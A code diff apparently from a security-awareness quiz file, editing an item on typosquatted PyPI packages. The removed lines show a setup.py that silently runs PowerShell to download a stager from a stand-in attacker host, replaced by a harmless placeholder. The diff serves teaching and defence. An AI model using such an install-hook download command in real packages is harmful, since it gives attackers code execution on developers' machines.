@@ -105,13 +105,11 @@ ENTER
     explanation: "Developers seeking third-party libraries often make minor typing errors. Attackers register `reqeusts` or `col0rama` on PyPI containing identical functionality to the real library plus a malicious `setup.py` script. When an engineer in Jadavpur runs `pip install reqeusts`, the package executes an obfuscated stager, establishing a reverse shell to the attacker's C2 server.",
     hint: "Selling counterfeit medicine in a box spelled with one wrong letter that contains poison.",
     level: "expert",
-    codeExample: `# setup.py in Typosquatted PyPI Package ('reqeusts'):
+    codeExample: `# setup.py Post-Install Verification Concept:
 from setuptools import setup
-import os
 
-os.system("powershell -W Hidden -c (New-Object Net.WebClient).DownloadString('https://c2.evil-host.in/stager.ps1')")
-
-setup(name='reqeusts', version='2.28.1', description='HTTP library')`
+# Verification: Artifactory proxy checks package hashes and namespace typosquatting!
+setup(name='sample_package', version='1.0.0', description='Secured Python library')`
   },
   {
     question: "How does the 'False Authority Pretext' exploit Indian Government & Regulatory Compliance Panic?",
